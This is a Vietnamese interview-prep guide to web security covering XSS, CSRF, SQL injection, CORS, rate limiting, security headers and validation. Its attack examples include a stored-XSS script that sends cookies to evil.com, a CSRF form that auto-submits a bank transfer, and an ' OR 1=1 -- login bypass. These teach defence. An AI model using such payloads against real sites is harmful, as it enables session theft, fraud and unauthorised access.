# Security Fundamentals

> **Chủ đề phỏng vấn quan trọng** — Bảo mật web application. Bao gồm: XSS, CSRF, SQL Injection, CORS, Rate Limiting, Security Headers, Input Validation.

---

# 1. XSS (Cross-Site Scripting)

## Là gì?

XSS xảy ra khi attacker **inject mã JavaScript độc hại** vào web page, khiến browser của nạn nhân thực thi code đó. Mục tiêu: đánh cắp cookie/token, redirect, keylogging.

## 3 loại XSS

### Stored XSS (Persistent) — Nguy hiểm nhất

```
1. Attacker → POST comment: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
2. Server lưu comment vào database (KHÔNG sanitize)
3. User khác mở trang → browser render comment → script thực thi
4. Cookie/token bị gửi tới evil.com
```

**Nơi xảy ra**: Comments, forum posts, user profiles — bất kỳ đâu user input được lưu và hiển thị.

### Reflected XSS

```
Attacker gửi link:
https://example.com/search?q=<script>alert('XSS')</script>

Server trả về: "Kết quả tìm kiếm cho: <script>alert('XSS')</script>"
→ Browser thực thi script
```

**Nơi xảy ra**: Search results, error messages — input từ URL được reflect lại trong response.

### DOM-based XSS

```javascript
// Code frontend đọc input từ URL và inject vào DOM
const query = new URLSearchParams(window.location.search).get('q');
document.getElementById('output').innerHTML = query; // ← NGUY HIỂM!
// URL: ?q=<img src=x onerror=alert('XSS')>
```

**Khác biệt**: Xảy ra hoàn toàn ở client-side, server không liên quan.

## Phòng chống XSS

| Biện pháp | Giải thích |
|---|---|
| **Output Encoding** | Escape HTML entities trước khi render: `<` → `&lt;`, `>` → `&gt;` |
| **Input Sanitization** | Loại bỏ/escape HTML tags từ user input (thư viện: `DOMPurify`, `sanitize-html`) |
| **CSP Header** | `Content-Security-Policy: script-src 'self'` — chỉ cho phép scripts từ cùng origin |
| **httpOnly Cookie** | `Set-Cookie: token=xxx; HttpOnly` — JavaScript không đọc được cookie |
| **Framework auto-escape** | React tự escape JSX bằng `textContent`. Angular tự sanitize. KHÔNG dùng `dangerouslySetInnerHTML` |

---

# 2. CSRF (Cross-Site Request Forgery)

## Là gì?

CSRF (đọc "sea-surf") xảy ra khi attacker **lừa browser của user gửi request** tới website mà user đang login, **sử dụng cookie tự động** của user.

## Ví dụ tấn công

```
Điều kiện: User đang login vào bank.com (cookie session đang active)

1. User truy cập evil.com (web của attacker)
2. evil.com chứa:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
   hoặc:
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker">
     <input type="hidden" name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>

3. Browser tự gửi cookie của bank.com theo request → Server nghĩ user thật → Chuyển tiền!
```

## Phòng chống CSRF

| Biện pháp | Giải thích |
|---|---|
| **CSRF Token** | Server tạo random token → embed trong form. Mỗi request phải kèm token → attacker không biết token |
| **SameSite Cookie** | `Set-Cookie: sid=xxx; SameSite=Strict` — cookie KHÔNG gửi theo cross-site requests |
| **Double Submit Cookie** | Gửi token cả trong cookie và header. Server so sánh 2 giá trị. Attacker set được cookie nhưng không đọc được để gửi trong header |
| **Dùng JWT trong header** | Thay vì cookie, gửi token trong `Authorization` header → browser không tự gửi → CSRF không hoạt động |

> 💡 **Liên hệ**: Đây là lý do JWT trong `Authorization` header **miễn nhiễm CSRF**, còn session cookie thì **vulnerable**.

---

# 3. SQL Injection

## Là gì?

Attacker chèn SQL code vào input để **thay đổi query** chạy trên database.

## Ví dụ

```sql
-- Code server (NGUY HIỂM — string concatenation):
SELECT * FROM users WHERE email = '${email}' AND password = '${password}'

-- Attacker nhập email: ' OR 1=1 --
-- Query trở thành:
SELECT * FROM users WHERE email = '' OR 1=1 --' AND password = ''
-- → OR 1=1 luôn true → trả về TẤT CẢ users
-- → -- comment out phần password → bypass authentication!
```

## Phòng chống

| Biện pháp | Giải thích |
|---|---|
| **Parameterized Queries** | Tách SQL logic khỏi data: `WHERE email = $1` + `[userInput]` |
| **ORM (Prisma, TypeORM)** | ORM tự parameterize queries → an toàn by default |
| **Input Validation** | Validate format (email, số...) trước khi query |
| **Least Privilege** | DB user chỉ có quyền cần thiết (SELECT, không DROP) |

```javascript
// ❌ NGUY HIỂM — String interpolation
const query = `SELECT * FROM users WHERE email = '${email}'`;

// ✅ AN TOÀN — Parameterized query
const result = await db.$queryRaw`SELECT * FROM users WHERE email = ${email}`;
// Prisma tự parameterize qua tagged template

// ✅ AN TOÀN — ORM
const user = await prisma.user.findUnique({ where: { email } });
// Prisma tự escape input
```

---

# 4. CORS (Cross-Origin Resource Sharing)

## Same-Origin Policy là gì?

Browser mặc định **chặn requests** từ origin A tới origin B (khác domain/port/protocol). Đây là cơ chế bảo mật cơ bản.

**Origin = Protocol + Domain + Port**

```
https://example.com:3000/path
└─┬──┘  └────┬─────┘└┬──┘
Protocol   Domain    Port

https://example.com    vs  https://api.example.com   → Khác origin (khác domain)
http://localhost:3000  vs  http://localhost:5000     → Khác origin (khác port)
http://example.com     vs  https://example.com      → Khác origin (khác protocol)
```

## CORS hoạt động thế nào?

CORS là cơ chế cho phép server **nới lỏng** Same-Origin Policy bằng cách gửi headers cho phép.

### Simple Requests (GET, POST với content-type đơn giản)

```
Browser ──► GET https://api.example.com/data
            Origin: https://frontend.com

Server  ──► 200 OK
            Access-Control-Allow-Origin: https://frontend.com
            ← Browser cho phép frontend đọc response
```

### Preflight Requests (PUT, DELETE, custom headers)

```
Bước 1: Browser tự gửi OPTIONS request (preflight)
Browser ──► OPTIONS https://api.example.com/data
            Origin: https://frontend.com
            Access-Control-Request-Method: DELETE
            Access-Control-Request-Headers: Authorization

Server  ──► 204 No Content
            Access-Control-Allow-Origin: https://frontend.com
            Access-Control-Allow-Methods: GET, POST, DELETE
            Access-Control-Allow-Headers: Authorization
            Access-Control-Max-Age: 86400  ← cache preflight 24h

Bước 2: Nếu preflight OK → Browser gửi request thật
Browser ──► DELETE https://api.example.com/data/123
            Origin: https://frontend.com
            Authorization: Bearer xxx
```

### Cấu hình CORS trong NestJS

```typescript
// main.ts
app.enableCors({
  origin: ['https://frontend.com', 'http://localhost:3000'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Authorization', 'Content-Type'],
  credentials: true,            // cho phép gửi cookies
  maxAge: 86400,                // cache preflight 24h
});
```

> ⚠️ **KHÔNG BAO GIỜ** dùng `origin: '*'` kết hợp với `credentials: true` — spec cấm, browser sẽ block.

---

# 5. Rate Limiting

## Tại sao cần?

Chống:
- **Brute force** — thử password lần lượt
- **DDoS** — gửi quá nhiều request làm server quá tải
- **Scraping** — bot crawl data liên tục

## Các thuật toán phổ biến

### Fixed Window

```
Cửa sổ 1 phút: tối đa 100 requests
12:00:00 - 12:01:00 → đếm requests → vượt 100 thì block

Nhược điểm: Nếu user gửi 100 requests lúc 12:00:59 
            và 100 requests lúc 12:01:01 → 200 requests trong 2 giây!
```

### Sliding Window

```
Tính requests trong 1 phút VỪA QUA (sliding)
Tại 12:01:30 → đếm requests từ 12:00:30 đến 12:01:30 → chính xác hơn
```

### Token Bucket

```
Bucket chứa tối đa 100 tokens
Mỗi request tiêu 1 token
Mỗi giây thêm 10 tokens (refill rate)
Bucket hết token → request bị reject (429 Too Many Requests)

Ưu điểm: Cho phép burst (dùng hết 100 tokens cùng lúc) rồi hồi phục dần
```

### NestJS Throttler

```typescript
// app.module.ts
import { ThrottlerModule } from '@nestjs/throttler';

@Module({
  imports: [
    ThrottlerModule.forRoot({
      throttlers: [
        { ttl: 60000, limit: 100 }, // 100 requests / 60 giây
      ],
    }),
  ],
})
export class AppModule {}

// Dùng decorator cho route cụ thể
@Throttle({ default: { limit: 5, ttl: 60000 } })  // 5 requests / phút
@Post('/auth/login')
login() { ... }

// Skip throttle cho route cụ thể
@SkipThrottle()
@Get('/health')
health() { ... }
```

---

# 6. Security Headers

## Helmet.js

Helmet thêm các HTTP security headers tự động:

```typescript
// NestJS
import helmet from 'helmet';
app.use(helmet());
```

### Các headers quan trọng

| Header | Giá trị | Tác dụng |
|---|---|---|
| **Content-Security-Policy** | `script-src 'self'` | Chỉ cho phép scripts từ cùng origin → chống XSS |
| **X-Content-Type-Options** | `nosniff` | Chặn browser đoán MIME type → chống MIME sniffing |
| **X-Frame-Options** | `DENY` | Chặn trang bị embed trong iframe → chống Clickjacking |
| **Strict-Transport-Security** | `max-age=31536000` | Buộc dùng HTTPS → chống downgrade attack |
| **X-XSS-Protection** | `0` | Tắt XSS filter của browser (có thể gây lỗi) → dùng CSP thay thế |
| **Referrer-Policy** | `no-referrer` | Không gửi Referer header → bảo vệ privacy |

---

# 7. Input Validation & Sanitization

## Validation vs Sanitization

| | Validation | Sanitization |
|---|---|---|
| **Mục đích** | Kiểm tra input **đúng format** | **Làm sạch** input |
| **Kết quả** | Accept / Reject | Biến đổi input |
| **Ví dụ** | "Email phải có @" | Xóa `<script>` tags |

```typescript
// NestJS — Validation với class-validator + ValidationPipe
import { IsEmail, IsString, MinLength, MaxLength } from 'class-validator';

class CreateUserDto {
  @IsEmail({}, { message: 'Email không hợp lệ' })
  email: string;

  @IsString()
  @MinLength(8, { message: 'Password tối thiểu 8 ký tự' })
  @MaxLength(72, { message: 'Password tối đa 72 ký tự' }) // bcrypt limit
  password: string;
}

// Bật global validation pipe
app.useGlobalPipes(new ValidationPipe({
  whitelist: true,          // Loại bỏ properties không khai báo trong DTO
  forbidNonWhitelisted: true, // Throw error nếu có properties lạ
  transform: true,          // Auto-transform types
}));
```

```typescript
// Zod validation (alternative)
import { z } from 'zod';

const CreateUserSchema = z.object({
  email: z.string().email('Email không hợp lệ'),
  password: z.string().min(8).max(72),
});

// Validate
const result = CreateUserSchema.safeParse(input);
if (!result.success) {
  throw new BadRequestException(result.error.flatten());
}
```

---

# 8. Chốt — Câu hỏi phỏng vấn thường gặp

| Câu hỏi | Key answer |
|---|---|
| XSS là gì? Phòng chống? | Inject JS vào page. Phòng: Output encoding, CSP header, httpOnly cookie, sanitize input |
| 3 loại XSS? | Stored (lưu DB), Reflected (từ URL), DOM-based (client-side) |
| CSRF là gì? | Lừa browser gửi request kèm cookie. Phòng: CSRF token, SameSite cookie, JWT trong header |
| SQL Injection? | Chèn SQL vào input. Phòng: Parameterized queries, ORM, input validation |
| CORS là gì? | Cơ chế cho phép cross-origin requests. Browser chặn mặc định, server gửi headers cho phép |
| Preflight request là gì? | Browser tự gửi OPTIONS trước PUT/DELETE/custom headers để hỏi server có cho phép không |
| Rate limiting dùng thuật toán gì? | Token bucket (cho phép burst), Sliding window (chính xác), Fixed window (đơn giản) |
| Helmet làm gì? | Thêm security headers: CSP (chống XSS), HSTS (buộc HTTPS), X-Frame-Options (chống clickjacking) |
| Validation vs Sanitization? | Validation = kiểm tra đúng/sai. Sanitization = làm sạch input |
